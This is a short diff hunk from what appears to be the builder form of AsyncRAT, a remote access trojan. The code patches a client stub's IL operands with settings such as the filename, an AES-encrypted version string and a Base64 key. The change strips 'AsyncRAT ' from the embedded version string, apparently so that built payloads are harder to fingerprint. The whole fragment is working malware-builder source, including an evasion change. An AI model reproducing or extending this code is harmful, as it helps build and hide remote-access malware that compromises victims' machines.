@@ -385,7 +385,7 @@ namespace AsyncRAT_Sharp.Forms
                                     method.Body.Instructions[i].Operand = textFilename.Text;
 
                                 if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version);
+                                    method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ",""));
 
                                 if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                                     method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
